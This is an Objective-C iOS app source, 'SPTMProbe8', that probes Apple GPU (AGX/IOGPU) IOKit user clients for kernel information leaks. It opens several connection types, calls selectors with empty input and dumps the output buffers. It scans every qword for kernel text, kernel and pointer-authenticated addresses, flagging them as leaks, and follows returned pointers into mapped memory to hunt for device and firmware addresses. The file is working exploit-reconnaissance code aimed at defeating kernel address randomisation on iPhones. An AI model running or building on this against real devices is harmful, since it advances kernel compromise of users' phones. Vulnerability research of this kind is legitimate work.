// SPTMProbe8 — AGX/IOGPU info-query exact-shape leak probe
// iOS 27.2 (24B115), iPhone14,7. Logs to Documents/SPTMProbe8.log.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <mach/vm_region.h>
// the iOS SDK ships a stub mach/mach_vm.h; declare the one symbol we need
extern kern_return_t mach_vm_region(vm_map_t target_task, mach_vm_address_t *address,
                                    mach_vm_size_t *size, vm_region_flavor_t flavor,
                                    vm_region_info_t info, mach_msg_type_number_t *infoCnt,
                                    mach_port_t *object_name);
#import <sys/utsname.h>
#import <unistd.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

static FILE *gFile;
static NSLock *gLock;
static NSString *gLogPath;
static UITextView *gView;
static NSMutableString *gBuf;
static int gLines;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap]; va_end(ap);
    if (!s) return;
    [gLock lock];
    if (gFile) { fprintf(gFile, "%s\n", s.UTF8String); fflush(gFile); }
    [gBuf appendFormat:@"%@\n", s];
    if (gBuf.length > 500000) [gBuf deleteCharactersInRange:NSMakeRange(0, 200000)];
    BOOL upd = (++gLines % 8) == 0;
    NSString *copy = upd ? [gBuf copy] : nil;
    [gLock unlock];
    if (upd) dispatch_async(dispatch_get_main_queue(), ^{
        if (gView) { gView.text = copy; [gView scrollRangeToVisible:NSMakeRange(copy.length?copy.length-1:0,1)]; }
    });
}

static NSString *hexdump(const uint8_t *p, size_t n) {
    if (!p || !n) return @"";
    if (n > 0x100) n = 0x100;
    NSMutableString *s = [NSMutableString string];
    for (size_t i=0;i<n;i+=16) {
        [s appendFormat:@"%04zx:",i];
        for (size_t j=0;j<16 && i+j<n;j++) [s appendFormat:@" %02x",p[i+j]];
        [s appendString:@"\n"];
    }
    return s;
}

static void scan_qwords(const uint8_t *p, size_t n, const char *tag) {
    if (!p || n < 8) return;
    for (size_t i=0;i+8<=n;i+=8) {
        uint64_t v; memcpy(&v,p+i,8);
        BOOL kern = (v >= 0xfffffff000000000ULL);
        BOOL ktext = (v >= 0xfffffff007004000ULL && v < 0xfffffff00aa78000ULL);
        BOOL pac = ((v >> 48) != 0 && (v >> 48) != 0xffff && (v & 0x800000000000ULL) != 0);
        if (kern || ktext || pac) {
            uint64_t strip = v & 0x0000ffffffffffffULL;
            L(@"[LEAK] %s +0x%03zx = 0x%016llx%s strip=0x%llx",
              tag, i, (unsigned long long)v,
              ktext ? " [KTEXT]" : (kern ? " [KERN]" : " [PAC?]"),
              (unsigned long long)strip);
        }
    }
}

static void read_user_page(uint64_t v, const char *tag) {
    if (v < 0x10000) return;
    if ((v >> 56) == 0x41 || (v >> 56) == 0x42 || (v >> 56) == 0x43) v &= 0x00ffffffffffffffULL;
    if (v >= 0x800000000000ULL) return;
    v &= ~0xfULL;
    mach_vm_address_t a=(mach_vm_address_t)v; mach_vm_size_t s=0;
    vm_region_basic_info_data_64_t info; mach_msg_type_number_t cnt=VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj=MACH_PORT_NULL; memset(&info,0,sizeof(info));
    kern_return_t kr=mach_vm_region(mach_task_self(),&a,&s,VM_REGION_BASIC_INFO_64,
                                    (vm_region_info_t)&info,&cnt,&obj);
    if (obj!=MACH_PORT_NULL) mach_port_deallocate(mach_task_self(),obj);
    if (kr!=KERN_SUCCESS) {
        L(@"[PAGE] %s v=0x%llx kr=0x%x (not mapped)",tag,(unsigned long long)v,kr);
        return;
    }
    L(@"[PAGE] %s v=0x%llx region=0x%llx+0x%llx prot=0x%x",tag,
      (unsigned long long)v,(unsigned long long)a,(unsigned long long)s,info.protection);
    if (s > 0x40000) { L(@"[PAGE] %s region too large, no read",tag); return; }
    if ((info.protection & VM_PROT_READ) == 0) { L(@"[PAGE] %s no read prot",tag); return; }
    if (v < a || s < (v-a)+0x100) { L(@"[PAGE] %s out of range",tag); return; }
    uint8_t b[0x100]; memcpy(b,(const void *)(uintptr_t)v,sizeof(b));
    L(@"[PAGE] %s bytes:\n%@",tag,hexdump(b,sizeof(b)));
    scan_qwords(b,sizeof(b),tag);
    if (s >= 0x4000 && (v - a) + 0x4000 <= s) {
        uint8_t *big = malloc(0x4000);
        if (big) {
            memcpy(big,(const void *)(uintptr_t)v,0x4000);
            int hits = 0;
            for (size_t i=0;i+8<=0x4000;i+=8) {
                uint64_t q; memcpy(&q,big+i,8);
                BOOL dev  = (q >= 0x04000000ULL && q < 0x08000000ULL);
                BOOL fw   = ((q >> 32) == 0xffffffa0ULL);
                BOOL win  = (q >= 0x100000000ULL && q < 0x200000000ULL);
                BOOL kern = (q >= 0xfffffff000000000ULL);
                BOOL tagv = ((q >> 56) == 0x41 || (q >> 56) == 0x42 || (q >> 56) == 0x43);
                if (dev || fw || win || kern || tagv) {
                    if (hits < 300) L(@"[PAGEQ] %s +0x%04zx = 0x%016llx%s%s%s%s%s",
                        tag,i,(unsigned long long)q,
                        dev?" DEV":"",fw?" FW":"",win?" WIN":"",kern?" KERN":"",tagv?" TAG":"");
                    hits++;
                }
            }
            L(@"[PAGEQ] %s total_hits=%d",tag,hits);
            free(big);
        }
    }
}

static void dump_all(const uint8_t *p, size_t n, const char *tag) {
    for (size_t i=0;i+8<=n;i+=8) {
        uint64_t v; memcpy(&v,p+i,8);
        L(@"[Q] %s +0x%03zx = 0x%016llx",tag,i,(unsigned long long)v);
    }
    scan_qwords(p,n,tag);
}

static void agx_info(const char *name) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(name));
    if (!svc) { L(@"[AGX] %s absent",name); return; }
    io_name_t cls={0}; IOObjectGetClass(svc,cls);
    L(@"[AGX] %s class=%s",name,cls);
    for (uint32_t type=0; type<=8; type++) {
        io_connect_t c=0;
        kern_return_t kr=IOServiceOpen(svc,mach_task_self(),type,&c);
        L(@"[AGX] %s type=%u open=0x%x conn=%u",name,type,kr,c);
        if (kr!=KERN_SUCCESS || !c) continue;
        struct { uint32_t sel; size_t sz; const char *n; } sels[] = {
            {0,0x40,"sel0"},{1,0x40,"sel1"},{2,0x218,"sel2"},
            {3,0x08,"sel3"},{4,0x20,"sel4"},{5,0x10,"sel5"},
            {6,0x10,"sel6"},{7,0x08,"sel7"},{8,0x10,"sel8"},
        };
        for (unsigned i=0;i<sizeof(sels)/sizeof(sels[0]);i++) {
            uint8_t *out=calloc(1,sels[i].sz);
            size_t olen=sels[i].sz;
            kr=IOConnectCallMethod(c,sels[i].sel,NULL,0,NULL,0,NULL,NULL,out,&olen);
            L(@"[AGX] %s t%u %s -> 0x%x olen=0x%zx",name,type,sels[i].n,kr,olen);
            if (kr==0 && olen) {
                L(@"[AGX] %s t%u %s out:\n%@",name,type,sels[i].n,hexdump(out,olen));
                dump_all(out,olen,sels[i].n);
                {
                    uint64_t q0=0,q1=0,q2=0;
                    memcpy(&q0,out,8);
                    if (olen>=0x10) memcpy(&q1,out+8,8);
                    if (olen>=0x18) memcpy(&q2,out+0x10,8);
                    if (sels[i].sel==2) {
                        read_user_page(q0,"sel2+0");
                        if (q2) read_user_page(q2,"sel2+0x10");
                    } else if (sels[i].sel==4) {
                        read_user_page(q0,"sel4+0");
                        read_user_page(q1,"sel4+8");
                        if (q2) read_user_page(q2,"sel4+0x10");
                    } else if (sels[i].sel==5) {
                        read_user_page(q0,"sel5+0");
                        read_user_page(q1,"sel5+8");
                    }
                }
            }
            free(out);
        }
        IOServiceClose(c);
    }
    IOObjectRelease(svc);
}

static void run(void) {
    struct utsname u; uname(&u);
    L(@"[RUN] SPTMProbe8 start %@ machine=%s rel=%s",[NSDate date],u.machine,u.release);
    agx_info("AGXAcceleratorG14P");
    agx_info("IOGPU");
    L(@"[RUN] done %@",[NSDate date]);
}

@interface D : UIResponder <UIApplicationDelegate>
@property (nonatomic) UIWindow *w;
@end
@implementation D
- (BOOL)application:(UIApplication*)a didFinishLaunchingWithOptions:(NSDictionary*)o {
    gLock=[NSLock new]; gBuf=[NSMutableString new]; gLines=0;
    NSString *docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];
    gLogPath=[docs stringByAppendingPathComponent:@"SPTMProbe8.log"];
    gFile=fopen(gLogPath.fileSystemRepresentation,"a");
    if(!gFile){gLogPath=[NSTemporaryDirectory() stringByAppendingPathComponent:@"SPTMProbe8.log"];gFile=fopen(gLogPath.fileSystemRepresentation,"a");}
    UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=[UIColor blackColor];
    gView=[[UITextView alloc] initWithFrame:vc.view.bounds]; gView.backgroundColor=[UIColor blackColor]; gView.textColor=[UIColor greenColor]; gView.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular]; gView.editable=NO; gView.text=gLogPath; [vc.view addSubview:gView];
    self.w=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds]; self.w.rootViewController=vc; [self.w makeKeyAndVisible];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW,(int64_t)(1.0*NSEC_PER_SEC)),dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();});
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,@"D");}}
